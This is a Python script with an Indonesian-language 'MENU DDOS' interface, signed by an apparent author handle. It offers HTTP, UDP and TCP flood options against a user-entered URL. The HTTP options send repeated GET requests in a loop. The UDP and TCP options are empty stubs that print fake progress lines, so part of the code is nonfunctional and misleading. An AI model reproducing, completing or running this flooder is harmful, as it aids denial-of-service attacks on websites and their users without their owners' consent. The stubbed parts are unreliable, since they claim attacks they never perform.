import requests
import time
import os

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_color(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

def flood(url, total_requests, delay):
    print_color(f"FLOOD to {url} with {total_requests} requests and {delay} second delay...", "33")
    for i in range(total_requests):
        response = requests.get(url)
        print_color(f"Request {i+1}: {response.status_code}", "32")
        time.sleep(delay)

def http_flood(url, total_requests, delay):
    print_color(f"HTTP FLOOD to {url} with {total_requests} requests and {delay} second delay...", "33")
    for i in range(total_requests):
        response = requests.get(url)
        print_color(f"Request {i+1}: {response.status_code}", "32")
        time.sleep(delay)

def udp_flood(url, total_requests, delay):
    print_color(f"UDP FLOOD to {url} with {total_requests} requests and {delay} second delay...", "33")
    # Implementasi UDP Flood di sini
    # Perlu library tambahan untuk UDP
    for i in range(total_requests):
        # Kirim paket UDP
        print_color(f"Request {i+1}: ...", "32")
        time.sleep(delay)

def tcp_flood(url, total_requests, delay):
    print_color(f"TCP FLOOD to {url} with {total_requests} requests and {delay} second delay...", "33")
    # Implementasi TCP Flood di sini
    # Perlu library tambahan untuk TCP
    for i in range(total_requests):
        # Kirim paket TCP
        print_color(f"Request {i+1}: ...", "32")
        time.sleep(delay)

while True:
    clear_screen()
    print_color("=======================", "36")
    print_color("Author=By.Thonxyzz404  ", "32")
    print_color("=======================", "36")
    print_color("      MENU DDOS        ", "32")
    print_color("=======================", "36")
    print_color("1. FLOOD", "33")
    print_color("2. HTTP FLOOD", "33")
    print_color("3. UDP", "33")
    print_color("4. TCP", "33")
    print_color("=======================", "36")

    pilihan = input("Masukkan Pilihan: ")

    if pilihan == "1":
        url = input("Masukkan URL: ")
        total_requests = int(input("Masukkan Jumlah Permintaan: "))
        delay = float(input("Masukkan Delay (detik): "))
        flood(url, total_requests, delay)
    elif pilihan == "2":
        url = input("Masukkan URL: ")
        total_requests = int(input("Masukkan Jumlah Permintaan: "))
        delay = float(input("Masukkan Delay (detik): "))
        http_flood(url, total_requests, delay)
    elif pilihan == "3":
        url = input("Masukkan URL: ")
        total_requests = int(input("Masukkan Jumlah Permintaan: "))
        delay = float(input("Masukkan Delay (detik): "))
        udp_flood(url, total_requests, delay)
    elif pilihan == "4":
        url = input("Masukkan URL: ")
        total_requests = int(input("Masukkan Jumlah Permintaan: "))
        delay = float(input("Masukkan Delay (detik): "))
        tcp_flood(url, total_requests, delay)
    else:
        print_color("Pilihan tidak valid.", "31")

    input("Tekan Enter untuk kembali ke menu...")